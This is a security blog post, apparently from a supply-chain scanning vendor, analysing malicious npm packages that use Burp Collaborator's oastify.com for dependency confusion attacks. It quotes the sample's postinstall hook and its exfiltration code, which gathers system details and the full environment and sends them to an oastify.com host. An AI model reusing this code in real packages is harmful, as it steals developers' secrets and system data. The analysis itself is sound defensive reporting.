@@ -1,0 +1,111 @@
+---
+publishDate: 2025-01-16T00:00:00Z
+title: 'Malicious npm Packages using Burp Collaborator for Dependency Confusion Attack'
+image: /images/burp-collaborator-dependency-confusion.png
+excerpt: Multiple npm packages impersonating popular package names were published to the npm registry including by a Snyk researcher apparently targeting internal packages at Cursor AI.
+tags:
+  - npm
+  - malware
+---
+
+Recently a Hacker News discussion on [Snyk security researcher deploys
+malicious NPM packages targeting
+cursor.com](https://news.ycombinator.com/item?id=42690473) highlighted
+interesting insights related to using Burp Collaborator's `oastify.com` as
+[Command and Control](#) (C2) server for exfiltrating data. In this particular
+case, the researcher published multiple npm packages to the public npm registry
+apparently targeting internal packages at Cursor in a [dependency confusion](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610) attack.
+
+## SafeDep Analysis
+
+Our [Malicious Package Scanner](https://docs.safedep.io/cloud/malware-analysis) deployed to monitor `npm` registry for malicious packages
+identified similar patterns in multiple packages published during the month of January 2025. In fact a simple query
+identified 50+ such packages.
+
+![](/images/malysis-npm-oastify.jpeg)
+
+### Looking at a Sample
+
+We took a closer look at one of the samples `pkg:/npm/patternfly-v5/patternfly@1.0.2`. 
+The sample contained the following files:
+
+```
+-rw-r--r--  1 dev  wheel  1365 Oct 26  1985 index.js
+-rw-r--r--  1 dev  wheel   283 Oct 26  1985 package.json
+-rw-r--r--  1 dev  wheel     0 Oct 26  1985 patternfly-addons.css
+-rw-r--r--  1 dev  wheel     0 Oct 26  1985 patternfly.min.css
+```
+
+The `package.json` had a `postinstall` script to execute the payload:
+
+```json
+{
+  "name": "@patternfly-v5/patternfly",
+  "version": "1.0.2",
+  "description": "A package for testing supply chain attacks.",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "echo 'Patternfly malicious package executed!'"
+  },
+  "author": "Your Name",
+  "license": "MIT"
+}
+```
+
+The payload was in `index.js` and contained exfiltration logic such as
+
+```javascript
+function sendData(path, data) {
+  const options = {
+    hostname: 'rzucd2dfiuz08dnqwkigu37xfolf95xu.oastify.com',
+    port: 443,
+    path: `/${path}`,
+    method: 'GET',
+    headers: {
+      'Content-Type': 'application/json'
+    }
+  };
+
+  const req = https.request(options, (res) => {
+    console.log(`Status: ${res.statusCode}`);
+  });
+
+  req.on('error', (error) => {
+    console.error(`Error: ${error.message}`);
+  });
+
+  req.write(JSON.stringify(data));
+  req.end();
+}
+```
+
+Followed by system information gathering code
+
+```javascript
+const systemInfo = {
+  hostname: os.hostname(),
+  platform: os.platform(),
+  arch: os.arch(),
+  release: os.release(),
+  userInfo: os.userInfo(),
+  networkInterfaces: os.networkInterfaces(),
+  env: process.env
+};
+```
+
+### Example Packages using `oastify.com` for Exfiltration
+
+| Package                                     | SafeDep Malicious Package Scanning Result                                                                |
+| ------------------------------------------- | -------------------------------------------------------------------------------------------------------- |
+| `chrome-api-utils@1.1.0`                    | [🔗 01JGPYQTZJGM0Y5BYZWZ0757P3](https://platform.safedep.io/community/malysis/01JGPYQTZJGM0Y5BYZWZ0757P3) |
+| `grafana-sentry-datasource@1.0.4`           | [🔗 01JH3FWEBCCXBGGRTN286Z5ARP](https://platform.safedep.io/community/malysis/01JH3FWEBCCXBGGRTN286Z5ARP) |
+| `@patternfly-v5/patternfly@1.0.2`           | [🔗 01JH0BKSY7Y2DNG7QB137S6J6F](https://platform.safedep.io/community/malysis/01JH0BKSY7Y2DNG7QB137S6J6F) |
+| `electron-builder-13@13.4.5`                | [🔗 01JH01T0FQQ14NX3DKNJXG0SPC](https://platform.safedep.io/community/malysis/01JH01T0FQQ14NX3DKNJXG0SPC) |
+| `graphql.vscode-graphql-syntax@99.99.99`    | [🔗 01JF2FS909Y3SHC099S6ETY7X1](https://platform.safedep.io/community/malysis/01JF2FS909Y3SHC099S6ETY7X1) |
+| `mattermost-cloudnative-bootstrapper@1.0.0` | [🔗 01JF1PE7YACMTYBQGG59VVHDZ1](https://platform.safedep.io/community/malysis/01JF1PE7YACMTYBQGG59VVHDZ1) |
+
+## Conclusion
+
+All packages appeared to be similar in nature i.e. leveraged Burp Suite's [Collaborator](https://portswigger.net/burp/documentation/collaborator)
+service as a public endpoint for capturing exfiltrated data. We did not observe any sophistication or attempt
+to conceal malicious behavior. This potentially indicate red team activity or unsophisticated threat actor groups.
